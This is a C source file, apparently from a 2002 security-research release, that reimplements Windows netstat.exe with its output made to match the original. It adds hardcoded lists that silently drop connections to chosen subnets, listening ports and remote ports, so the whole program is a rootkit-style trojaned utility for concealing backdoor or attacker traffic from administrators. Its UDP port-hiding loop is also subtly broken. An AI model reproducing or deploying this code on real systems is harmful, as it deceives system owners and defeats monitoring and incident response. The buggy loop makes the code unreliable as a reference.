/*
 * uninformed research
 * http://www.uninformed.org
 *
 * implementation of all the netstat.exe functionality for win 98/me/nt/2k/xp.
 * this code has the added ability to hide subnets, listening ports, and remote ports
 * from the viewer.
 *
 * ALL output should look exactly like netstat.exe.  If anyone sees otherwise, please 
 * let me know.
 *
 * i've only tested this in win2k.  all the functionality should work across the 
 * platforms.  however, i'm worried about output being the same.  please let me
 * know if you run across something.
 *
 * skape
 * 7/21/2002
 * mmiller@hick.org
 *
 * compile with:
 *
 * cl /ML /W3 /GX /O1 netstat.c /link user32.lib iphlpapi.lib ws2_32.lib
 *
 */
#include <stdlib.h>
#include <stdio.h>

#include <windows.h>
#include <iphlpapi.h>

/*
 * List of subnets and their respective netmasks that we wish to hide.
 * This array should always be terminated by a NULL subnet.
 */
struct {
	const char *subnet;
	const char *netmask;	
} hideSubnets[] = {
	{ "1.2.3.0",		"255.255.255.0"	},
	{ NULL,				NULL					},
};

/*
 * Array of listening ports we wish to hide. 
 */
unsigned short hideListenPorts[] = {
	12345
};

/*
 * Array of remote ports (ports the machine is connected to) that we wish to hide.
 */
unsigned short hideRemotePorts[] = {
	12345
};

struct {

	unsigned char dontResolve;

	struct {
		unsigned char allConnectAndListening;
		unsigned char ethernetStatistics;
		char          specificProtocol[16];
		unsigned char routingTable;
		unsigned char perProtocolStatistics;
	} display;

	int interval;

} netstat;

void displayEthernetStatistics();
void displayPerProtocolStatistics();
void displayRoutingTable();
void displayActiveConnections();
void displayHelp();

void resolveAddress(unsigned long addr, char *buf, unsigned long bufSize, unsigned char isSrcAddress);
void resolvePort(unsigned short port, char *buf, unsigned long bufSize, const char *proto);

int main(int argc, char **argv)
{
	int x = 1, y, incrementX;
	WORD version;
	WSADATA data;

	version = MAKEWORD(2, 2);

	if (WSAStartup(version, &data) != 0)
		return 0;

	memset(&netstat, 0, sizeof(netstat));

	strcpy(netstat.display.specificProtocol, "DEF-TCP");

	if (argc > 1)
	{
		unsigned char unknownArgument = 0;

		for (x = 1; x < argc; x++)
		{
			if (argv[x][0] == '-')
			{
				incrementX = 0;

				for (y = 1; y < (int)strlen(argv[x]); y++)
				{
					switch (argv[x][y])
					{
						case 'a':
							netstat.display.allConnectAndListening = 1;
							break;
						case 'e':
							netstat.display.ethernetStatistics = 1;
							break;
						case 'n':
							netstat.dontResolve = 1;
							break;
						case 'p':
							incrementX = 1;

							if (x+1 == argc)
								memset(netstat.display.specificProtocol, 0, sizeof(netstat.display.specificProtocol));
							else
							{
								if ((stricmp(argv[x+1], "tcp")) && (stricmp(argv[x+1], "udp")) && (stricmp(argv[x+1], "ip")))
									displayHelp();
								else
									strncpy(netstat.display.specificProtocol, argv[x+1], sizeof(netstat.display.specificProtocol)-1);
							}
							break;
						case 'r':
							netstat.display.routingTable = 1;
							break;
						case 's':
							netstat.display.perProtocolStatistics = 1;
							break;
						default:
							displayHelp();
							break;
					}
				}
				
				if (incrementX)
					x++;
			}
			else if (x != argc-1)
				displayHelp();
			else
			{
				netstat.interval = atoi(argv[x]);

				if (!netstat.interval)
					displayHelp();
			}
		}
	}

	while (1)
	{
		if (netstat.display.ethernetStatistics)
			displayEthernetStatistics();
		if (netstat.display.perProtocolStatistics)
			displayPerProtocolStatistics();
		if (netstat.display.routingTable)
			displayRoutingTable();

		if ((!netstat.display.ethernetStatistics) && (!netstat.display.routingTable) && (!netstat.display.perProtocolStatistics))
			displayActiveConnections();

		if (netstat.interval)
			SleepEx(netstat.interval * 1000, TRUE);
		else
			break;
	}

	WSACleanup();

	return 0;
}

void displayEthernetStatistics()
{
	MIB_IFTABLE *ifTable = (MIB_IFTABLE *)malloc(sizeof(MIB_IFTABLE) * 24);
	DWORD ifTableSize = sizeof(MIB_IFTABLE) * 24, x;
	struct {
		DWORD inBytes, outBytes;
		DWORD inUcastPkts, outUcastPkts;
		DWORD inNUcastPkts, outNUcastPkts;
		DWORD inDiscards, outDiscards;
		DWORD inErrors, outErrors;
		DWORD unknownProtocols;
	} interfaceStatistics;

	fprintf(stdout,"Interface Statistics\r\n"
						"\r\n"
						"                        %11s\t%11s\r\n"
						"\r\n",
						"Received", "Sent");

	memset(&interfaceStatistics, 0, sizeof(interfaceStatistics));
	
	GetIfTable(ifTable, &ifTableSize, FALSE);

	for (x = 0; 
			x < ifTable->dwNumEntries;
			x++)
	{
		interfaceStatistics.inBytes += ifTable->table[x].dwInOctets;
		interfaceStatistics.outBytes += ifTable->table[x].dwOutOctets;

		interfaceStatistics.inUcastPkts += ifTable->table[x].dwInUcastPkts;
		interfaceStatistics.outUcastPkts += ifTable->table[x].dwOutUcastPkts;
		
		interfaceStatistics.inNUcastPkts += ifTable->table[x].dwInNUcastPkts;
		interfaceStatistics.outNUcastPkts += ifTable->table[x].dwOutNUcastPkts;

		interfaceStatistics.inDiscards += ifTable->table[x].dwInDiscards;
		interfaceStatistics.outDiscards += ifTable->table[x].dwOutDiscards;
		
		interfaceStatistics.inErrors += ifTable->table[x].dwInErrors;
		interfaceStatistics.outErrors += ifTable->table[x].dwOutErrors;

		interfaceStatistics.unknownProtocols += ifTable->table[x].dwInUnknownProtos;	
	}

	fprintf(stdout,"Bytes                   %11lu\t%11lu\r\n", interfaceStatistics.inBytes, interfaceStatistics.outBytes);
	fprintf(stdout,"Unicast packets         %11lu\t%11lu\r\n", interfaceStatistics.inUcastPkts, interfaceStatistics.outUcastPkts);
	fprintf(stdout,"Non-unicast packets     %11lu\t%11lu\r\n", interfaceStatistics.inNUcastPkts, interfaceStatistics.outNUcastPkts);
	fprintf(stdout,"Discards                %11lu\t%11lu\r\n", interfaceStatistics.inDiscards, interfaceStatistics.outDiscards);
	fprintf(stdout,"Errors                  %11lu\t%11lu\r\n", interfaceStatistics.inErrors, interfaceStatistics.outErrors);
	fprintf(stdout,"Unknown protocols       %11lu\r\n", interfaceStatistics.unknownProtocols);

	free(ifTable);
}

void displayPerProtocolStatistics()
{
	int printAllStatistics = (!stricmp(netstat.display.specificProtocol,"DEF-TCP"))?1:0;

	if ((printAllStatistics) || (!stricmp(netstat.display.specificProtocol,"IP")))
	{
		MIB_IPSTATS ipStatistics;

		memset(&ipStatistics, 0, sizeof(MIB_IPSTATS));

		GetIpStatistics(&ipStatistics);	

		fprintf(stdout,"\r\nIP Statistics\r\n\r\n");
	
		fprintf(stdout,"  Packets Received                   = %lu\r\n", ipStatistics.dwInReceives);
		fprintf(stdout,"  Received Header Errors             = %lu\r\n", ipStatistics.dwInHdrErrors);
		fprintf(stdout,"  Received Address Errors            = %lu\r\n", ipStatistics.dwInAddrErrors);
		fprintf(stdout,"  Datagrams Forwarded                = %lu\r\n", ipStatistics.dwForwDatagrams);
		fprintf(stdout,"  Unknown Protocols Received         = %lu\r\n", ipStatistics.dwInUnknownProtos);
		fprintf(stdout,"  Received Packets Discarded         = %lu\r\n", ipStatistics.dwInDiscards);
		fprintf(stdout,"  Received Packets Delivered         = %lu\r\n", ipStatistics.dwInDelivers);
		fprintf(stdout,"  Output Requests                    = %lu\r\n", ipStatistics.dwOutRequests);
		fprintf(stdout,"  Routing Discards                   = %lu\r\n", ipStatistics.dwRoutingDiscards);
		fprintf(stdout,"  Discarded Output Packets           = %lu\r\n", ipStatistics.dwOutDiscards);
		fprintf(stdout,"  Output Packet No Route             = %lu\r\n", ipStatistics.dwOutNoRoutes);
		fprintf(stdout,"  Reassembly Required                = %lu\r\n", ipStatistics.dwReasmReqds);
		fprintf(stdout,"  Reassembly Successful              = %lu\r\n", ipStatistics.dwReasmOks);
		fprintf(stdout,"  Reassembly Failures                = %lu\r\n", ipStatistics.dwReasmFails);
		fprintf(stdout,"  Datagrams Successfully Fragmented  = %lu\r\n", ipStatistics.dwFragOks);
		fprintf(stdout,"  Datagrams Failing Fragmentation    = %lu\r\n", ipStatistics.dwFragFails);
		fprintf(stdout,"  Fragments Created                  = %lu\r\n", ipStatistics.dwFragCreates);
	}
	
	if ((printAllStatistics) || (!stricmp(netstat.display.specificProtocol,"ICMP")))
	{
#define ICMP_IN(x,y) x.stats.icmpInStats.y
#define ICMP_OUT(x,y) x.stats.icmpOutStats.y

		MIB_ICMP icmpStatistics;

		memset(&icmpStatistics, 0, sizeof(MIB_ICMP));

		GetIcmpStatistics(&icmpStatistics);

		fprintf(stdout,"\r\nICMP Statistics\r\n\r\n");

		fprintf(stdout,"                            Received\tSent\r\n");
		fprintf(stdout,"  Messages                  %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwMsgs), ICMP_OUT(icmpStatistics, dwMsgs));
		fprintf(stdout,"  Errors                    %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwErrors), ICMP_OUT(icmpStatistics, dwErrors));
		fprintf(stdout,"  Destination Unreachable   %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwDestUnreachs), ICMP_OUT(icmpStatistics, dwDestUnreachs));
		fprintf(stdout,"  Time Exceeded             %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwTimeExcds), ICMP_OUT(icmpStatistics, dwTimeExcds));
		fprintf(stdout,"  Parameter Problems        %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwParmProbs), ICMP_OUT(icmpStatistics, dwParmProbs));
		fprintf(stdout,"  Source Quenches           %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwSrcQuenchs), ICMP_OUT(icmpStatistics, dwSrcQuenchs));
		fprintf(stdout,"  Redirects                 %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwRedirects), ICMP_OUT(icmpStatistics, dwRedirects));
		fprintf(stdout,"  Echos                     %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwEchos), ICMP_OUT(icmpStatistics, dwEchos));
		fprintf(stdout,"  Echo Replies              %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwEchoReps), ICMP_OUT(icmpStatistics, dwEchoReps));
		fprintf(stdout,"  Timestamps                %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwTimestamps), ICMP_OUT(icmpStatistics, dwTimestamps));
		fprintf(stdout,"  Timestamp Replies         %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwTimestampReps), ICMP_OUT(icmpStatistics, dwTimestampReps));
		fprintf(stdout,"  Address Masks             %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwAddrMasks), ICMP_OUT(icmpStatistics, dwAddrMasks));
		fprintf(stdout,"  Address Mask Replies      %lu\t\t%lu\r\n", ICMP_IN(icmpStatistics, dwAddrMaskReps), ICMP_OUT(icmpStatistics, dwAddrMaskReps));
	}
	
	if ((printAllStatistics) || (!stricmp(netstat.display.specificProtocol,"TCP")))
	{
		MIB_TCPSTATS tcpStatistics;

		memset(&tcpStatistics, 0, sizeof(MIB_TCPSTATS));

		GetTcpStatistics(&tcpStatistics);

		fprintf(stdout,"\r\nTCP Statistics\r\n\r\n");
		fprintf(stdout,"  Active Opens                        = %lu\r\n", tcpStatistics.dwActiveOpens);
		fprintf(stdout,"  Passive Opens                       = %lu\r\n", tcpStatistics.dwPassiveOpens);
		fprintf(stdout,"  Failed Connection Attempts          = %lu\r\n", tcpStatistics.dwAttemptFails);
		fprintf(stdout,"  Reset Connections                   = %lu\r\n", tcpStatistics.dwEstabResets);
		fprintf(stdout,"  Current Connections                 = %lu\r\n", tcpStatistics.dwCurrEstab);
		fprintf(stdout,"  Segments Received                   = %lu\r\n", tcpStatistics.dwInSegs);
		fprintf(stdout,"  Segments Sent                       = %lu\r\n", tcpStatistics.dwOutSegs);
		fprintf(stdout,"  Segments Retransmitted              = %lu\r\n", tcpStatistics.dwRetransSegs);
	}
	
	if ((printAllStatistics) || (!stricmp(netstat.display.specificProtocol,"UDP")))
	{
		MIB_UDPSTATS udpStatistics;

		memset(&udpStatistics, 0, sizeof(MIB_UDPSTATS));

		GetUdpStatistics(&udpStatistics);

		fprintf(stdout,"\r\nUDP Statistics\r\n\r\n");
		fprintf(stdout,"  Datagrams Received    = %lu\r\n", udpStatistics.dwInDatagrams);
		fprintf(stdout,"  No Ports              = %lu\r\n", udpStatistics.dwNoPorts);
		fprintf(stdout,"  Receive Errors        = %lu\r\n", udpStatistics.dwInErrors);
		fprintf(stdout,"  Datagrams Sent        = %lu\r\n", udpStatistics.dwOutDatagrams);
	}
}

void displayRoutingTable()
{
	/* 
	 * Amazingly enough, this is what MS does.
	 * 
	 * .text:010017BB                 push    offset aRoutePrint ; "route print"
	 * .text:010017C0                 call    ds:system
	 */

	system("route print");
}

void displayActiveConnections()
{
	char srcIpBuffer[128], dstIpBuffer[128], state[32], fullSrcBuffer[140], fullDstBuffer[140], localPortName[16], remotePortName[16];
	unsigned short localPort, remotePort;
	int x, y, curr, breakOut = 0;

	srcIpBuffer[sizeof(srcIpBuffer)-1] = 0;
	dstIpBuffer[sizeof(dstIpBuffer)-1] = 0;

	fullSrcBuffer[sizeof(fullSrcBuffer)-1] = 0;
	fullDstBuffer[sizeof(fullDstBuffer)-1] = 0;

	localPortName[sizeof(localPortName)-1] = 0;
	remotePortName[sizeof(remotePortName)-1] = 0;

	fprintf(stdout,"\r\nActive Connections\r\n\r\n"
						"  Proto  Local Address          Foreign Address        State\r\n");

	if ((netstat.display.allConnectAndListening) || (!stricmp(netstat.display.specificProtocol, "DEF-TCP")) || (!stricmp(netstat.display.specificProtocol, "TCP")))
	{
		DWORD tcpTableSize = sizeof(MIB_TCPTABLE) * 128;
		MIB_TCPTABLE *tcpTable = (MIB_TCPTABLE *)malloc(tcpTableSize);

		tcpTable->dwNumEntries = 0;

		GetTcpTable(tcpTable, &tcpTableSize, TRUE);

		for (x = 0; 
				x < (int)tcpTable->dwNumEntries;
				x++)
		{
			breakOut = 0;

			if ((tcpTable->table[x].dwState == MIB_TCP_STATE_LISTEN) && (!netstat.display.allConnectAndListening))
				continue;

			/*
			 * Hide subnet check.
			 */
			for (curr = 0;
					hideSubnets[curr].subnet;
					curr++)
			{
				DWORD currSubnet = inet_addr(hideSubnets[curr].subnet), currNetmask = inet_addr(hideSubnets[curr].netmask);

				/*
				 * If this hosts matches one of the hide subnets.
				 */
				if ((breakOut = ((currSubnet & currNetmask) == (tcpTable->table[x].dwRemoteAddr & currNetmask))))
					break;						 
			}

			if (breakOut)
				continue;

			/*
			 * Hide listen port check.
			 */

			localPort = ntohs((unsigned short)(tcpTable->table[x].dwLocalPort & 0xFFFF));
			remotePort = ntohs((unsigned short)(tcpTable->table[x].dwRemotePort & 0xFFFF));

			if (tcpTable->table[x].dwState == MIB_TCP_STATE_LISTEN)
			{
				for (curr = 0;
						curr < (sizeof(hideListenPorts) / sizeof(unsigned short));
						curr++)
				{
					if ((breakOut = (localPort == hideListenPorts[curr])))
						break;
				}
			}
			else
			{
				/*
				 * Hide remote ports check.
				 */

				for (curr = 0;
						curr < (sizeof(hideRemotePorts) / sizeof(unsigned short));
						curr++)
				{
					if ((breakOut = (remotePort == hideRemotePorts[curr])))
						break;
				}
			}

			if (breakOut)
				continue;

			resolveAddress(tcpTable->table[x].dwLocalAddr, srcIpBuffer, sizeof(srcIpBuffer)-1, 1);
			resolveAddress(tcpTable->table[x].dwRemoteAddr, dstIpBuffer, sizeof(dstIpBuffer)-1, 0);

			switch (tcpTable->table[x].dwState)
			{
				case MIB_TCP_STATE_CLOSED:
					strcpy(state,"CLOSED"); break;
				case MIB_TCP_STATE_LISTEN:
					strcpy(state,"LISTENING"); break;
				case MIB_TCP_STATE_SYN_SENT:
					strcpy(state,"SYN_SENT"); break;
				case MIB_TCP_STATE_SYN_RCVD:
					strcpy(state,"SYN_RCVD"); break;
				case MIB_TCP_STATE_ESTAB:
					strcpy(state,"ESTABLISHED"); break;
				case MIB_TCP_STATE_FIN_WAIT1:
					strcpy(state,"FIN_WAIT1"); break;
				case MIB_TCP_STATE_FIN_WAIT2:
					strcpy(state,"FIN_WAIT2"); break;
				case MIB_TCP_STATE_CLOSE_WAIT:
					strcpy(state,"CLOSE_WAIT"); break;
				case MIB_TCP_STATE_CLOSING:
					strcpy(state,"CLOSING"); break;
				case MIB_TCP_STATE_LAST_ACK:
					strcpy(state,"LAST_ACK"); break;
				case MIB_TCP_STATE_TIME_WAIT:
					strcpy(state,"TIME_WAIT"); break;
				case MIB_TCP_STATE_DELETE_TCB:
					strcpy(state,"DELETE_TCB"); break;
			}

			memset(fullSrcBuffer, 0, sizeof(fullSrcBuffer));
			memset(fullDstBuffer, 0, sizeof(fullDstBuffer));

			if (tcpTable->table[x].dwState == MIB_TCP_STATE_LISTEN)
				remotePort = 0;

			resolvePort(localPort, localPortName, sizeof(localPortName)-1, "TCP");
			resolvePort(remotePort, remotePortName, sizeof(remotePortName)-1, "TCP");

			_snprintf(fullSrcBuffer, sizeof(fullSrcBuffer) - 1, "%s:%s", srcIpBuffer, localPortName);
			_snprintf(fullDstBuffer, sizeof(fullDstBuffer) - 1, "%s:%s", dstIpBuffer, remotePortName);

			for (y = strlen(fullSrcBuffer); 
					y < 23;
					y++)
				fullSrcBuffer[y] = ' ';
			for (y = strlen(fullDstBuffer); 
					y < 23;
					y++)
				fullDstBuffer[y] = ' ';

			if (strlen(fullDstBuffer) >= 23)
				fprintf(stdout,"  TCP    %23s%s  %s\r\n", fullSrcBuffer, fullDstBuffer, state);
			else
				fprintf(stdout,"  TCP    %23s%s%s\r\n", fullSrcBuffer, fullDstBuffer, state);
		}

		free(tcpTable);
	}

	if ((netstat.display.allConnectAndListening) && (!stricmp(netstat.display.specificProtocol, "udp")))
	{
		DWORD udpTableSize = sizeof(MIB_UDPTABLE) * 128;
		MIB_UDPTABLE *udpTable = (MIB_UDPTABLE *)malloc(udpTableSize);

		GetUdpTable(udpTable, &udpTableSize, TRUE);

		for (x = 0;
				x < (int)udpTable->dwNumEntries;
				x++)
		{
			localPort = ntohs((unsigned short)(udpTable->table[x].dwLocalPort & 0xFFFF));

			for (curr = 0;
					curr < (sizeof(hideListenPorts) / sizeof(unsigned short));
					curr++)
			{
				if (localPort == hideListenPorts[curr])
					continue;
			}

			resolveAddress(udpTable->table[x].dwLocalAddr, srcIpBuffer, sizeof(srcIpBuffer)-1, 1);

			memset(fullSrcBuffer, 0, sizeof(fullSrcBuffer));

			resolvePort(localPort, localPortName, sizeof(localPortName) - 1, "UDP");

			_snprintf(fullSrcBuffer, sizeof(fullSrcBuffer) - 1, "%s:%s", srcIpBuffer, localPortName);

			for (y = strlen(fullSrcBuffer);
					y < 23;
					y++)
				fullSrcBuffer[y] = ' ';

			fprintf(stdout,"  UDP    %s*:*\r\n", fullSrcBuffer);
		}

		free(udpTable);
	}
}

void resolveAddress(unsigned long addr, char *buf, unsigned long bufSize, unsigned char isSrcAddress)
{
	struct hostent *h;
	unsigned long bufLength;

	bufLength = _snprintf(buf, bufSize, "%hi.%hi.%hi.%hi", 
						 	((unsigned char *)&addr)[0],
						 	((unsigned char *)&addr)[1],
						 	((unsigned char *)&addr)[2],
						 	((unsigned char *)&addr)[3]);

	if (netstat.dontResolve)
		return;

	if ((isSrcAddress) || (addr == 0))
	{
		char hostname[30];

		memset(hostname, 0, 30);

		if (gethostname(hostname, sizeof(hostname) - 1) == 0)
			strncpy(buf, hostname, bufSize);
	}
	else if ((h = gethostbyaddr((const char *)&addr, 4, AF_INET)))
		strncpy(buf, h->h_name, bufSize);
}

void resolvePort(unsigned short port, char *buf, unsigned long bufSize, const char *proto)
{
	struct servent *sent;

	_snprintf(buf, bufSize, "%d", port);

	if (netstat.dontResolve)
		return;

	if ((sent = getservbyport(htons(port), proto)))
		_snprintf(buf, bufSize, "%s", sent->s_name);
}

void displayHelp()
{
	fprintf(stdout,"\r\n"
						"Displays protocol statistics and current TCP/IP network connections.\r\n"
						"\r\n"
						"NETSTAT [-a] [-e] [-n] [-s] [-p proto] [-r] [interval]\r\n"
						"\r\n"
						"  -a            Displays all connections and listening ports.\r\n"
						"  -e            Displays Ethernet statistics. This may be combined with the -s\r\n"
						"                option.\r\n"
						"  -n            Displays addresses and port numbers in numerical form.\r\n"
						"  -p proto      Shows connections for the protocol specified by proto; proto\r\n"
						"                may be TCP or UDP.  If used with the -s option to display\r\n"
						"                per-protocol statistics, proto may be TCP, UDP, or IP.\r\n"
						"  -r            Displays the routing table.\r\n"
						"  -s            Displays per-protocol statistics.  By default, statistics are\r\n"
						"                shown for TCP, UDP and IP; the -p option may be used to specify\r\n"
						"                a subset of the default.\r\n"
						"  interval      Redisplays selected statistics, pausing interval seconds\r\n"
						"                between each display.  Press CTRL+C to stop redisplaying\r\n"
						"                statistics.  If omitted, netstat will print the current\r\n"
						"                configuration information once.\r\n"
						"\r\n");

	exit(0);
}
